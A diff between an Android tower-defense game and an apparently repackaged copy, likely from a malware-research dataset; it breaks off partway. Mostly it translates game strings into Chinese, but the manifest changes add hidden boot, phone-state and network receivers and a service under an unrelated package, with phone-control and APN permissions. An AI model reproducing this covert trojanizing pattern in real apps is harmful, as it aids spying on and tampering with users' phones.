@@ -1,0 +1,1849 @@
+diff -r result/APP_35/App_B_35/AndroidManifest.xml result/APP_35/App_M_35/AndroidManifest.xml
+17a18,38
+>         <receiver android:name="com.xxx.yyy.MyBoolService">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.BOOT_COMPLETED"/>
+>             </intent-filter>
+>         </receiver>
+>         <receiver android:name="com.xxx.yyy.MyAlarmReceiver">
+>             <intent-filter>
+>                 <action android:name="com.lz.myservicestart"/>
+>             </intent-filter>
+>         </receiver>
+>         <service android:enabled="true" android:name="com.xxx.yyy.MyService"/>
+>         <receiver android:name="com.xxx.yyy.NetWorkReceiver">
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>         </receiver>
+>         <receiver android:name="com.xxx.yyy.CustomBroadcastReceiver">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PHONE_STATE"/>
+>             </intent-filter>
+>         </receiver>
+18a40,46
+>     <uses-permission android:name="android.permission.WRITE_APN_SETTINGS"/>
+>     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+>     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+>     <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+>     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+>     <uses-permission android:name="android.permission.INTERNET"/>
+>     <uses-permission android:name="android.permission.MODIFY_PHONE_STATE"/>
+diff -r result/APP_35/App_B_35/apktool.yml result/APP_35/App_M_35/apktool.yml
+2c2
+< apkFileName: Bapp35-479524F88939A67F8DDD7A4235A26E6228A81FA56A00666795E439B00B41F1F8.apk
+---
+> apkFileName: Mapp35-C42B95620CAAAE1C03DFE1F2C756A3583CD0731D8522EE3275E9196DB8027753.apk
+5,7d4
+< - resources.arsc
+< - png
+< - jpg
+8a6,7
+> - jpg
+> - png
+diff -r result/APP_35/App_B_35/com/magicwach/rdefense/AchievementActivity.java result/APP_35/App_M_35/com/magicwach/rdefense/AchievementActivity.java
+68c68
+<     localStringBuffer.append("You Have ");
+---
+>     localStringBuffer.append("您有");
+70c70
+<     localStringBuffer.append(" Achievement Point");
+---
+>     localStringBuffer.append(" 成就点");
+72c72
+<       localStringBuffer.append("s");
+---
+>       localStringBuffer.append("");
+109c109
+<     ((TextView)findViewById(2131099693)).setText("Each achievement you unlock adds to your in-game bonus!");
+---
+>     ((TextView)findViewById(2131099693)).setText(" 您开启的每个成就将添加到你的游戏的奖金中！");
+diff -r result/APP_35/App_B_35/com/magicwach/rdefense/AchievementAlert.java result/APP_35/App_M_35/com/magicwach/rdefense/AchievementAlert.java
+127c127
+<     paramCanvas.drawText("Achievement Earned:", rect.left + 10, rect.top + 20, paramPaint);
+---
+>     paramCanvas.drawText("挣得的成就:", rect.left + 10, rect.top + 20, paramPaint);
+diff -r result/APP_35/App_B_35/com/magicwach/rdefense/AchievementData.java result/APP_35/App_M_35/com/magicwach/rdefense/AchievementData.java
+118c118
+<     AchievementProp localAchievementProp = new AchievementProp("Complete Any Map", paramSharedPreferences, 1);
+---
+>     AchievementProp localAchievementProp = new AchievementProp("完成任意地图", paramSharedPreferences, 1);
+120,121c120,121
+<     localAchievementProp.description = "Finish any map";
+<     localAchievementProp = new AchievementProp("Complete Difficulty 2", paramSharedPreferences, 1);
+---
+>     localAchievementProp.description = "完成任意地图";
+>     localAchievementProp = new AchievementProp("完成难度等级 2", paramSharedPreferences, 1);
+123,124c123,124
+<     localAchievementProp.description = "Finish a map with the difficulty level set to 2 or more";
+<     localAchievementProp = new AchievementProp("Complete Difficulty 5", paramSharedPreferences, 1);
+---
+>     localAchievementProp.description = "完成难度级别为 2 或更高的地图";
+>     localAchievementProp = new AchievementProp("完成难度等级 5", paramSharedPreferences, 1);
+126,127c126,127
+<     localAchievementProp.description = "Finish a map with the difficulty level set to 5 or more";
+<     localAchievementProp = new AchievementProp("Complete Difficulty 8", paramSharedPreferences, 1);
+---
+>     localAchievementProp.description = "完成难度级别为 5 或更高的地图";
+>     localAchievementProp = new AchievementProp("完成难度等级 8", paramSharedPreferences, 1);
+129,130c129,130
+<     localAchievementProp.description = "Finish a map with the difficulty level set to 8 or more";
+<     localAchievementProp = new AchievementProp("Complete Difficulty 11", paramSharedPreferences, 1);
+---
+>     localAchievementProp.description = "完成难度级别为 8 或更高的地图";
+>     localAchievementProp = new AchievementProp("完成难度等级 11", paramSharedPreferences, 1);
+132,133c132,133
+<     localAchievementProp.description = "Finish a map with the difficulty level set to 11 or more";
+<     localAchievementProp = new AchievementProp("Complete Difficulty 14", paramSharedPreferences, 1);
+---
+>     localAchievementProp.description = "完成难度级别为 11 或更高的地图";
+>     localAchievementProp = new AchievementProp("完成难度等级 14", paramSharedPreferences, 1);
+135,136c135,136
+<     localAchievementProp.description = "Finish a map with the difficulty level set to 14 or more";
+<     localAchievementProp = new AchievementProp("Complete Difficulty 17", paramSharedPreferences, 1);
+---
+>     localAchievementProp.description = "完成难度级别为 14 或更高的地图";
+>     localAchievementProp = new AchievementProp("完成难度等级 17", paramSharedPreferences, 1);
+138,139c138,139
+<     localAchievementProp.description = "Finish a map with the difficulty level set to 17 or more";
+<     localAchievementProp = new AchievementProp("Complete Difficulty 20", paramSharedPreferences, 1);
+---
+>     localAchievementProp.description = "完成难度级别为 17 或更高的地图";
+>     localAchievementProp = new AchievementProp("完成难度等级 20", paramSharedPreferences, 1);
+141,142c141,142
+<     localAchievementProp.description = "Finish a map with the difficulty level set to 20";
+<     localAchievementProp = new AchievementProp("Perfect 25", paramSharedPreferences, 1);
+---
+>     localAchievementProp.description = "完成难度级别为 20 或更高的地图";
+>     localAchievementProp = new AchievementProp("完成 25", paramSharedPreferences, 1);
+144,145c144,145
+<     localAchievementProp.description = "Get Level bonus to 25";
+<     localAchievementProp = new AchievementProp("Perfect 50", paramSharedPreferences, 1);
+---
+>     localAchievementProp.description = "获得等级奖金 25";
+>     localAchievementProp = new AchievementProp("完成 50", paramSharedPreferences, 1);
+147,148c147,148
+<     localAchievementProp.description = "Get Level bonus to 50";
+<     localAchievementProp = new AchievementProp("Perfect 100", paramSharedPreferences, 1);
+---
+>     localAchievementProp.description = "获得等级奖金 50";
+>     localAchievementProp = new AchievementProp("完成 100", paramSharedPreferences, 1);
+150,151c150,151
+<     localAchievementProp.description = "Finish a map without losing any health";
+<     localAchievementProp = new AchievementProp("Fast-Paced", paramSharedPreferences, 1);
+---
+>     localAchievementProp.description = "完成任意地图，而不减少生命值";
+>     localAchievementProp = new AchievementProp("快节奏", paramSharedPreferences, 1);
+153,154c153,154
+<     localAchievementProp.description = "Finish a map without creating any slow towers";
+<     localAchievementProp = new AchievementProp("Rocketman", paramSharedPreferences, 1);
+---
+>     localAchievementProp.description = "完成一张没有产生减速慢塔的地图";
+>     localAchievementProp = new AchievementProp("火箭人", paramSharedPreferences, 1);
+156,157c156,157
+<     localAchievementProp.description = "Finish a map without creating any gun towers";
+<     localAchievementProp = new AchievementProp("Gunner", paramSharedPreferences, 1);
+---
+>     localAchievementProp.description = "完成一个没有产生任何枪塔的地图";
+>     localAchievementProp = new AchievementProp("炮手", paramSharedPreferences, 1);
+159,160c159,160
+<     localAchievementProp.description = "Finish a map without creating any rocket towers";
+<     localAchievementProp = new AchievementProp("Cheapskate", paramSharedPreferences, 1);
+---
+>     localAchievementProp.description = "完成一个没有产生任何火箭塔地图";
+>     localAchievementProp = new AchievementProp("吝啬鬼", paramSharedPreferences, 1);
+162,163c162,163
+<     localAchievementProp.description = "Finish a map without upgrading any towers";
+<     localAchievementProp = new AchievementProp("Big Spender", paramSharedPreferences, 1);
+---
+>     localAchievementProp.description = "完成一张地图没有升级任何炮塔";
+>     localAchievementProp = new AchievementProp("大富豪", paramSharedPreferences, 1);
+165,166c165,166
+<     localAchievementProp.description = "Finish a map with all towers fully-upgraded";
+<     localAchievementProp = new AchievementProp("25K Club", paramSharedPreferences, 25000);
+---
+>     localAchievementProp.description = "完成地图上所有炮塔升级";
+>     localAchievementProp = new AchievementProp("25K 俱乐部", paramSharedPreferences, 25000);
+168,169c168,169
+<     localAchievementProp.description = "Defeat 25K enemies";
+<     localAchievementProp = new AchievementProp("Big Score", paramSharedPreferences, 1000000);
+---
+>     localAchievementProp.description = "战胜 25K 敌人";
+>     localAchievementProp = new AchievementProp("大分数", paramSharedPreferences, 1000000);
+171,172c171,172
+<     localAchievementProp.description = "Score 1,000,000 lifetime points";
+<     localAchievementProp = new AchievementProp("Huge Score", paramSharedPreferences, 50000000);
+---
+>     localAchievementProp.description = "得到 1,000,000 生命点";
+>     localAchievementProp = new AchievementProp("巨大的分数", paramSharedPreferences, 50000000);
+174,175c174,175
+<     localAchievementProp.description = "Score 50,000,000 lifetime points";
+<     localAchievementProp = new AchievementProp("Experienced", paramSharedPreferences, 1000);
+---
+>     localAchievementProp.description = "得到 5,000,000 生命点";
+>     localAchievementProp = new AchievementProp("有经验的", paramSharedPreferences, 1000);
+177,178c177,178
+<     localAchievementProp.description = "Finish 1000 levels";
+<     localAchievementProp = new AchievementProp("Powered up", paramSharedPreferences, 1);
+---
+>     localAchievementProp.description = "完成 1000 等级";
+>     localAchievementProp = new AchievementProp("力量升级", paramSharedPreferences, 1);
+180,181c180,181
+<     localAchievementProp.description = "Finish a map with 12 or fewer towers";
+<     localAchievementProp = new AchievementProp("No Sale", paramSharedPreferences, 1);
+---
+>     localAchievementProp.description = "以 12 个或更少的塔完成地图";
+>     localAchievementProp = new AchievementProp("无出售", paramSharedPreferences, 1);
+183,184c183,184
+<     localAchievementProp.description = "Finish a map without selling a tower";
+<     localAchievementProp = new AchievementProp("Fast Lane", paramSharedPreferences, 1);
+---
+>     localAchievementProp.description = "完成地图而没有出售炮塔";
+>     localAchievementProp = new AchievementProp("快速道", paramSharedPreferences, 1);
+186,187c186,187
+<     localAchievementProp.description = "Finish at least 75 levels with fast-forward turned on during a game";
+<     localAchievementProp = new AchievementProp("Addict", paramSharedPreferences, 5000);
+---
+>     localAchievementProp.description = "在游戏中以快进打开，完成至少 75 级";
+>     localAchievementProp = new AchievementProp("上瘾者", paramSharedPreferences, 5000);
+189,190c189,190
+<     localAchievementProp.description = "Finish 5000 levels";
+<     localAchievementProp = new AchievementProp("75K Club", paramSharedPreferences, 75000);
+---
+>     localAchievementProp.description = "完成 5000 等级";
+>     localAchievementProp = new AchievementProp("75K 俱乐部", paramSharedPreferences, 75000);
+192,193c192,193
+<     localAchievementProp.description = "Defeat 75K enemies";
+<     localAchievementProp = new AchievementProp("Risk Taker", paramSharedPreferences, 1);
+---
+>     localAchievementProp.description = "击败 75K 敌人";
+>     localAchievementProp = new AchievementProp("冒险者", paramSharedPreferences, 1);
+195,196c195,196
+<     localAchievementProp.description = "Finish a map with 1 health remaining";
+<     localAchievementProp = new AchievementProp("Solid Effort", paramSharedPreferences, 1);
+---
+>     localAchievementProp.description = "完成地图，剩余 1 生命值";
+>     localAchievementProp = new AchievementProp("坚实的成就", paramSharedPreferences, 1);
+198,199c198,199
+<     localAchievementProp.description = "Finish a map with at least 18 health";
+<     localAchievementProp = new AchievementProp("Rainy Day", paramSharedPreferences, 1);
+---
+>     localAchievementProp.description = "用至少 18 生命值完成地图";
+>     localAchievementProp = new AchievementProp("穷困期", paramSharedPreferences, 1);
+201,202c201,202
+<     localAchievementProp.description = "Collect $1000 during a game";
+<     localAchievementProp = new AchievementProp("Big Saver", paramSharedPreferences, 1);
+---
+>     localAchievementProp.description = "在游戏中收集 $1000";
+>     localAchievementProp = new AchievementProp("大储蓄者", paramSharedPreferences, 1);
+204,205c204,205
+<     localAchievementProp.description = "Collect $2500 during a game";
+<     localAchievementProp = new AchievementProp("Crazy Saver", paramSharedPreferences, 1);
+---
+>     localAchievementProp.description = "在游戏中收集 $2500";
+>     localAchievementProp = new AchievementProp("疯狂的储蓄者", paramSharedPreferences, 1);
+207,208c207,208
+<     localAchievementProp.description = "Collect $5000 during a game";
+<     localAchievementProp = new AchievementProp("Big One", paramSharedPreferences, 1);
+---
+>     localAchievementProp.description = "在游戏中收集$5000";
+>     localAchievementProp = new AchievementProp("大家伙", paramSharedPreferences, 1);
+210,211c210,211
+<     localAchievementProp.description = "Earn 500+ points from a single enemy";
+<     localAchievementProp = new AchievementProp("Whopper", paramSharedPreferences, 1);
+---
+>     localAchievementProp.description = "从单独一个敌人身上赚到500+ 点";
+>     localAchievementProp = new AchievementProp("硕大的物体", paramSharedPreferences, 1);
+213,214c213,214
+<     localAchievementProp.description = "Earn 1000+ points from a single enemy";
+<     localAchievementProp = new AchievementProp("Good Game", paramSharedPreferences, 1);
+---
+>     localAchievementProp.description = "从单一的敌人赚1000 +点";
+>     localAchievementProp = new AchievementProp("精彩的比赛", paramSharedPreferences, 1);
+216,217c216,217
+<     localAchievementProp.description = "Earn 250000+ points during a game";
+<     localAchievementProp = new AchievementProp("Great Game", paramSharedPreferences, 1);
+---
+>     localAchievementProp.description = "在游戏中赚取 250000+ 点数";
+>     localAchievementProp = new AchievementProp("大游戏", paramSharedPreferences, 1);
+219,220c219,220
+<     localAchievementProp.description = "Earn 500000+ points during a game";
+<     localAchievementProp = new AchievementProp("Amazing Game", paramSharedPreferences, 1);
+---
+>     localAchievementProp.description = "在游戏中赚取 500000+ 点数";
+>     localAchievementProp = new AchievementProp("刺激的游戏", paramSharedPreferences, 1);
+222,223c222,223
+<     localAchievementProp.description = "Earn 1000000+ points during a game";
+<     localAchievementProp = new AchievementProp("Basic 10", paramSharedPreferences, 10);
+---
+>     localAchievementProp.description = "在游戏中赚取1000000 +点";
+>     localAchievementProp = new AchievementProp("初级 10", paramSharedPreferences, 10);
+225,226c225,226
+<     localAchievementProp.description = "Finish the Basic level 10 times";
+<     localAchievementProp = new AchievementProp("Basic 25", paramSharedPreferences, 25);
+---
+>     localAchievementProp.description = "完成初级 10 次";
+>     localAchievementProp = new AchievementProp("初级 25", paramSharedPreferences, 25);
+228,229c228,229
+<     localAchievementProp.description = "Finish the Basic level 25 times";
+<     localAchievementProp = new AchievementProp("Basic level 40", paramSharedPreferences, 1);
+---
+>     localAchievementProp.description = "完成初级 25 次";
+>     localAchievementProp = new AchievementProp("初级 40", paramSharedPreferences, 1);
+231,232c231,232
+<     localAchievementProp.description = "Finish the Basic level at difficulty level 40";
+<     localAchievementProp = new AchievementProp("Basic level 60", paramSharedPreferences, 1);
+---
+>     localAchievementProp.description = "完成难度级别为 40 的初级";
+>     localAchievementProp = new AchievementProp("初级 60", paramSharedPreferences, 1);
+234,235c234,235
+<     localAchievementProp.description = "Finish the Basic level at difficulty level 60";
+<     localAchievementProp = new AchievementProp("Ruins 10", paramSharedPreferences, 10);
+---
+>     localAchievementProp.description = "完成难度级别为 60 的初级";
+>     localAchievementProp = new AchievementProp("废墟 10", paramSharedPreferences, 10);
+237,238c237,238
+<     localAchievementProp.description = "Finish the the Ruins 10 times";
+<     localAchievementProp = new AchievementProp("Ruins 25", paramSharedPreferences, 25);
+---
+>     localAchievementProp.description = "完成废墟 10 次";
+>     localAchievementProp = new AchievementProp("废墟 25", paramSharedPreferences, 25);
+240,241c240,241
+<     localAchievementProp.description = "Finish the the Ruins 25 times";
+<     localAchievementProp = new AchievementProp("The Ruins level 30", paramSharedPreferences, 1);
+---
+>     localAchievementProp.description = "完成废墟 25 次";
+>     localAchievementProp = new AchievementProp("30级 废墟", paramSharedPreferences, 1);
+243,244c243,244
+<     localAchievementProp.description = "Finish the the Ruins at difficulty level 30";
+<     localAchievementProp = new AchievementProp("The Ruins level 50", paramSharedPreferences, 1);
+---
+>     localAchievementProp.description = "完成难度级别为 30 的废墟";
+>     localAchievementProp = new AchievementProp("50级 废墟", paramSharedPreferences, 1);
+246,247c246,247
+<     localAchievementProp.description = "Finish the the Ruins at difficulty level 50";
+<     localAchievementProp = new AchievementProp("Factory 10", paramSharedPreferences, 10);
+---
+>     localAchievementProp.description = "完成难度级别为 50 的废墟";
+>     localAchievementProp = new AchievementProp("工厂 10", paramSharedPreferences, 10);
+249,250c249,250
+<     localAchievementProp.description = "Finish the the Factory 10 times";
+<     localAchievementProp = new AchievementProp("Factory 25", paramSharedPreferences, 25);
+---
+>     localAchievementProp.description = "完成工厂 10 次";
+>     localAchievementProp = new AchievementProp("工厂 25", paramSharedPreferences, 25);
+252,253c252,253
+<     localAchievementProp.description = "Finish the the Factory 25 times";
+<     localAchievementProp = new AchievementProp("The Factory level 20", paramSharedPreferences, 1);
+---
+>     localAchievementProp.description = "完成工厂 25 次";
+>     localAchievementProp = new AchievementProp("工厂级别20", paramSharedPreferences, 1);
+255,256c255,256
+<     localAchievementProp.description = "Finish the the Factory at difficulty level 20";
+<     localAchievementProp = new AchievementProp("The Factory level 40", paramSharedPreferences, 1);
+---
+>     localAchievementProp.description = "完成难度级别为 20 的工厂";
+>     localAchievementProp = new AchievementProp("工厂级别 40", paramSharedPreferences, 1);
+258c258
+<     localAchievementProp.description = "Finish the the Factory at difficulty level 40";
+---
+>     localAchievementProp.description = "完成难度级别为 40 的工厂";
+261,262c261,262
+<     localAchievementProp.description = "Finish a game at level >= 30 and health >= 30";
+<     localAchievementProp = new AchievementProp("Courtyard 10", paramSharedPreferences, 10);
+---
+>     localAchievementProp.description = "30 完成级别>= 30 且健康>= 30 的游戏";
+>     localAchievementProp = new AchievementProp("庭院 10", paramSharedPreferences, 10);
+264,265c264,265
+<     localAchievementProp.description = "Finish the the Courtyard 10 times";
+<     localAchievementProp = new AchievementProp("Courtyard 25", paramSharedPreferences, 25);
+---
+>     localAchievementProp.description = "完成庭院 10 次";
+>     localAchievementProp = new AchievementProp("庭院 25", paramSharedPreferences, 25);
+267,268c267,268
+<     localAchievementProp.description = "Finish the the Courtyard 25 times";
+<     localAchievementProp = new AchievementProp("The Courtyard level 15", paramSharedPreferences, 1);
+---
+>     localAchievementProp.description = "完成庭院 25 次";
+>     localAchievementProp = new AchievementProp("庭院级别 15", paramSharedPreferences, 1);
+270,271c270,271
+<     localAchievementProp.description = "Finish the the Courtyard at difficulty level 15";
+<     localAchievementProp = new AchievementProp("The Courtyard level 25", paramSharedPreferences, 1);
+---
+>     localAchievementProp.description = "完成难度级别为 15 的庭院";
+>     localAchievementProp = new AchievementProp("庭院级别25", paramSharedPreferences, 1);
+273c273
+<     localAchievementProp.description = "Finish the the Courtyard at difficulty level 25";
+---
+>     localAchievementProp.description = "完成难度级别为 25 的庭院";
+276c276
+<     localAchievementProp.description = "Finish 5 A-Coded VR Training missions";
+---
+>     localAchievementProp.description = "完成 5 D-Coded VR 受训任务";
+279c279
+<     localAchievementProp.description = "Finish 5 B-Coded VR Training missions";
+---
+>     localAchievementProp.description = "完成 5 D-Coded VR 受训任务";
+282c282
+<     localAchievementProp.description = "Finish 5 C-Coded VR Training missions";
+---
+>     localAchievementProp.description = "完成 5 D-Coded VR 受训任务";
+285,286c285,286
+<     localAchievementProp.description = "Finish 5 D-Coded VR Training missions";
+<     paramSharedPreferences = new AchievementProp("Titan Defeated", paramSharedPreferences, 1);
+---
+>     localAchievementProp.description = "完成 5 D-Coded VR 受训任务";
+>     paramSharedPreferences = new AchievementProp("打败泰坦", paramSharedPreferences, 1);
+288c288
+<     paramSharedPreferences.description = "Find and Defeat the Titan";
+---
+>     paramSharedPreferences.description = "找到并击败泰坦";
+diff -r result/APP_35/App_B_35/com/magicwach/rdefense/Display.java result/APP_35/App_M_35/com/magicwach/rdefense/Display.java
+256c256
+<     drawOverlay(paramCanvas, "Game Over", "(Choose 'New Game' From Menu To Play Again)");
+---
+>     drawOverlay(paramCanvas, "游戏结束", "(从 菜单 选择 '新游戏' 再玩一次)");
+261c261
+<     drawOverlay(paramCanvas, "Congratulations: You WIN!", "(Choose 'New Game' From Menu To Play Again)");
+---
+>     drawOverlay(paramCanvas, "恭喜: 您赢了!", "(从 菜单 选择 '新游戏' 再玩一次)");
+282c282
+<     paramCanvas.drawText("Welcome To Robo Defense", i, 60, this.text_paint);
+---
+>     paramCanvas.drawText("欢迎来到机器人塔防", i, 60, this.text_paint);
+284c284
+<     paramCanvas.drawText("(Tap Screen To Start Game)", i, 60 + 15, this.text_paint);
+---
+>     paramCanvas.drawText("(点击屏幕开始游戏)", i, 60 + 15, this.text_paint);
+287c287
+<     paramCanvas.drawText("Instructions:", 50, 120, this.text_paint);
+---
+>     paramCanvas.drawText("说明:", 50, 120, this.text_paint);
+289c289
+<     paramCanvas.drawText("- Prevent enemies from crossing the screen", 50, i, this.text_paint);
+---
+>     paramCanvas.drawText("- 阻止敌人逃跑", 50, i, this.text_paint);
+291c291
+<     paramCanvas.drawText("- Drag new towers from buttons on the lower right", 50, i, this.text_paint);
+---
+>     paramCanvas.drawText("- 点击右下角按钮拖动新建炮塔", 50, i, this.text_paint);
+293,294c293,294
+<     paramCanvas.drawText("- Tap a tower to upgrade it", 50, i, this.text_paint);
+<     paramCanvas.drawText("- Drag your finger to scroll the play area", 50, i + 20, this.text_paint);
+---
+>     paramCanvas.drawText("- 可以点击炮塔进行升级", 50, i, this.text_paint);
+>     paramCanvas.drawText("- 可以使用您的手指拖动游戏地图", 50, i + 20, this.text_paint);
+325c325
+<     paramCanvas.drawText("Game Paused", i, j, this.text_paint);
+---
+>     paramCanvas.drawText("游戏暂停", i, j, this.text_paint);
+diff -r result/APP_35/App_B_35/com/magicwach/rdefense/GameHud.java result/APP_35/App_M_35/com/magicwach/rdefense/GameHud.java
+50c50
+<     level = new HudEntry("Level:" + paramInt + "-");
+---
+>     level = new HudEntry("等级:" + paramInt + "-");
+52,53c52,53
+<     score = new HudEntry("Score:");
+<     bonus = new HudEntry("Bonus:");
+---
+>     score = new HudEntry("得分:");
+>     bonus = new HudEntry("奖金:");
+diff -r result/APP_35/App_B_35/com/magicwach/rdefense/LevelData.java result/APP_35/App_M_35/com/magicwach/rdefense/LevelData.java
+26c26
+<   private static final String[] name = { "Basic Level", "The Ruins", "The Factory", "The Courtyard", "VR Training" };
+---
+>   private static final String[] name = { "初级", "废墟", "工厂", "庭院", "虚拟现实训练" };
+diff -r result/APP_35/App_B_35/com/magicwach/rdefense/LevelSelectActivity.java result/APP_35/App_M_35/com/magicwach/rdefense/LevelSelectActivity.java
+37c37
+<     this.level_text.setText(" Level " + this.level + " ");
+---
+>     this.level_text.setText(" 等级 " + this.level + " ");
+147c147
+<     ((TextView)findViewById(2131099655)).setText("The max level is " + this.max_difficulty_level + ".  Win level " + this.max_difficulty_level + " to increase the max to " + (this.max_difficulty_level + 10) + "!");
+---
+>     ((TextView)findViewById(2131099655)).setText("最高等级是 " + this.max_difficulty_level + "。完成胜利等级 " + this.max_difficulty_level + " 后增加最高等级到" + (this.max_difficulty_level + 10) + "!");
+diff -r result/APP_35/App_B_35/com/magicwach/rdefense/OptionsData.java result/APP_35/App_M_35/com/magicwach/rdefense/OptionsData.java
+21c21
+<     OptionProp localOptionProp = new OptionProp("Enable Sound", false, paramSharedPreferences);
+---
+>     OptionProp localOptionProp = new OptionProp("启用声音", false, paramSharedPreferences);
+23c23
+<     localOptionProp = new OptionProp("Deactivate Fast Foward Between Levels", true, paramSharedPreferences);
+---
+>     localOptionProp = new OptionProp("下一波到来时取消加速", true, paramSharedPreferences);
+25c25
+<     localOptionProp = new OptionProp("Fast Forward Pause After Life Loss", true, paramSharedPreferences);
+---
+>     localOptionProp = new OptionProp("生命减少时暂停加速", true, paramSharedPreferences);
+27c27
+<     localOptionProp = new OptionProp("Prevent Screen From Locking", true, paramSharedPreferences);
+---
+>     localOptionProp = new OptionProp("防止屏幕锁定", true, paramSharedPreferences);
+29c29
+<     paramSharedPreferences = new OptionProp("Show Turrent Range While Placing/Upgrading", true, paramSharedPreferences);
+---
+>     paramSharedPreferences = new OptionProp("放置/升级时显示范围", true, paramSharedPreferences);
+diff -r result/APP_35/App_B_35/com/magicwach/rdefense/QuickSave.java result/APP_35/App_M_35/com/magicwach/rdefense/QuickSave.java
+76c76
+<           setStartupMsg("State Save: Could not open file");
+---
+>           setStartupMsg("状态保存: 无法打开文件");
+81c81
+<           setStartupMsg("State Save: write data failed");
+---
+>           setStartupMsg("状态保存: 写入数据失败");
+151c151
+<           paramGameState.showError("Quick Load Failed: bad eyecatcher");
+---
+>           paramGameState.showError("快速加载失败: bad eyecatcher");
+168c168
+<           paramGameState.showError("Quick Load Failed: Game was updated");
+---
+>           paramGameState.showError("快速加载失败: 游戏已更新");
+194c194
+<         paramGameState.showError("Quick Load Failed: could not open file");
+---
+>         paramGameState.showError("快速加载失败: 无法打开文件");
+200c200
+<         paramGameState.showError("Quick Load Failed: data corrupted (sorry)");
+---
+>         paramGameState.showError("快速加载失败: 数据损坏");
+207c207
+<         paramGameState.showError("Quick Load Failed: IO Error reading file");
+---
+>         paramGameState.showError("快速加载失败: 读取 IO 文件错误");
+212c212
+<         paramGameState.showError("Quick Load Failed");
+---
+>         paramGameState.showError("快速加载失败");
+217c217
+<         paramGameState.showMessage("Quick Load Success");
+---
+>         paramGameState.showMessage("快速加载成功");
+diff -r result/APP_35/App_B_35/com/magicwach/rdefense/RewardActivity.java result/APP_35/App_M_35/com/magicwach/rdefense/RewardActivity.java
+69c69
+<     localButton.setText("Upgrade");
+---
+>     localButton.setText("升级");
+81c81
+<     localTextView.setText("You Have " + i + " Reward Points");
+---
+>     localTextView.setText("您有" + i + " 奖励点数");
+160c160
+<         this.button.setText("Unlock");
+---
+>         this.button.setText("解锁");
+164c164
+<         ((SpannableStringBuilder)localObject).append("   [Unlocked");
+---
+>         ((SpannableStringBuilder)localObject).append("   [没有锁");
+185c185
+<         ((SpannableStringBuilder)localObject).append("  [Points: ");
+---
+>         ((SpannableStringBuilder)localObject).append("  [点数: ");
+188c188
+<         ((SpannableStringBuilder)localObject).append("   [Lvl: ");
+---
+>         ((SpannableStringBuilder)localObject).append("   [等级: ");
+190c190
+<         ((SpannableStringBuilder)localObject).append("  Points: ");
+---
+>         ((SpannableStringBuilder)localObject).append("  点数: ");
+diff -r result/APP_35/App_B_35/com/magicwach/rdefense/RewardData.java result/APP_35/App_M_35/com/magicwach/rdefense/RewardData.java
+80c80
+<     RewardProp localRewardProp = new RewardProp("Stronger Bullets", 50000, paramSharedPreferences);
+---
+>     RewardProp localRewardProp = new RewardProp("加强弹药", 50000, paramSharedPreferences);
+82,83c82,83
+<     localRewardProp.description_prefix = "Increase bullet power by";
+<     localRewardProp = new RewardProp("Stronger Explosives", 75000, paramSharedPreferences);
+---
+>     localRewardProp.description_prefix = "增加弹药威力";
+>     localRewardProp = new RewardProp("加强爆炸威力", 75000, paramSharedPreferences);
+85c85
+<     localRewardProp.description_prefix = "Increase rocket/missile/mortar explosive power by";
+---
+>     localRewardProp.description_prefix = "增加火箭/导弹/迫击炮弹爆炸威力";
+89c89
+<     localRewardProp = new RewardProp("Faster Rocket Reload", 40000, paramSharedPreferences);
+---
+>     localRewardProp = new RewardProp("提升火箭填弹速度", 40000, paramSharedPreferences);
+91c91
+<     localRewardProp.description_prefix = "Reload rockets";
+---
+>     localRewardProp.description_prefix = "提升火箭装填";
+93c93
+<     localRewardProp.description_suffix = "% faster";
+---
+>     localRewardProp.description_suffix = "% 速度";
+95c95
+<     localRewardProp = new RewardProp("Faster Antiair Reload", 20000, paramSharedPreferences);
+---
+>     localRewardProp = new RewardProp("提升防空装填速度", 20000, paramSharedPreferences);
+97c97
+<     localRewardProp.description_prefix = "Reload Antiair missiles";
+---
+>     localRewardProp.description_prefix = "提升防空导弹装填";
+99c99
+<     localRewardProp.description_suffix = "% faster";
+---
+>     localRewardProp.description_suffix = "% 速度";
+101c101
+<     localRewardProp = new RewardProp("Faster Artillery Reload", 30000, paramSharedPreferences);
+---
+>     localRewardProp = new RewardProp("提升火炮装填速度", 30000, paramSharedPreferences);
+103c103
+<     localRewardProp.description_prefix = "Reload mortar/artillery shells";
+---
+>     localRewardProp.description_prefix = "提升装填 迫击炮/炮弹";
+105c105
+<     localRewardProp.description_suffix = "% faster";
+---
+>     localRewardProp.description_suffix = "% 速度";
+107c107
+<     localRewardProp = new RewardProp("Longer Flame Burn", 15000, paramSharedPreferences);
+---
+>     localRewardProp = new RewardProp("火焰伤害伤时间", 15000, paramSharedPreferences);
+109c109
+<     localRewardProp.description_prefix = "Increase flame burn duration by";
+---
+>     localRewardProp.description_prefix = "增加火焰的害伤时间";
+113c113
+<     localRewardProp = new RewardProp("Longer Slowdown", 30000, paramSharedPreferences);
+---
+>     localRewardProp = new RewardProp("减速时间", 30000, paramSharedPreferences);
+115c115
+<     localRewardProp.description_prefix = "Increase slow tower effect duration by";
+---
+>     localRewardProp.description_prefix = "增加炮塔减速影响的持续时间";
+119c119
+<     localRewardProp = new RewardProp("Health Reward", 10000, paramSharedPreferences);
+---
+>     localRewardProp = new RewardProp("增加生命值", 10000, paramSharedPreferences);
+121,122c121,122
+<     localRewardProp.description_prefix = "Increase base health by";
+<     localRewardProp = new RewardProp("Starting Cash Reward", 25000, paramSharedPreferences);
+---
+>     localRewardProp.description_prefix = "增加基础生命值";
+>     localRewardProp = new RewardProp("增加现金奖励", 25000, paramSharedPreferences);
+124c124
+<     localRewardProp.description_prefix = "Increase starting cash by";
+---
+>     localRewardProp.description_prefix = "增加开始现金";
+126c126
+<     localRewardProp = new RewardProp("Unlock Teleport Tower", 1000000, paramSharedPreferences);
+---
+>     localRewardProp = new RewardProp("解锁远距离传送炮塔", 1000000, paramSharedPreferences);
+128c128
+<     localRewardProp.description_prefix = "Teleport Tower teleports enemies back to the start";
+---
+>     localRewardProp.description_prefix = "把即将通过的敌人传送回起点";
+131c131
+<     paramSharedPreferences = new RewardProp("Unlock Mine Tower", 500000, paramSharedPreferences);
+---
